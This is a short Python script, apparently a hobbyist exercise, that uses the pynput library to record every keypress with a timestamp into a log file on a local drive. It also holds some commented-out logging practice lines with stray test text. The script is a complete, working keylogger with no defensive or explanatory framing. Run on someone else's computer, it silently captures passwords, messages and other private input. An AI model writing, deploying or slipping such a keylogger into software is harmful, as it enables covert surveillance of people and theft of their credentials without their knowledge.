from asyncio.log import logger
from pynput.keyboard import Key, Listener
import logging

log_dir = r"F:\ "

logging.basicConfig(filename= log_dir + "newfile.log",level=logging.DEBUG, format='%(asctime)s %(message)s', filemode='w')

def on_press(key):
    logging.info(str(key ))

with Listener( on_press=on_press) as listener:
    listener.join()  

# logger = logging.getLogger()
# logger.setLevel(logging.DEBUG)enter helloooooo dfghjk
# logger.debug("harmless debug message ")
# logger.info("just an information")
# logger.warning("Its a Warning")
# logger.error("Did you try to divide by zero")
# logger.critical("Internet is down")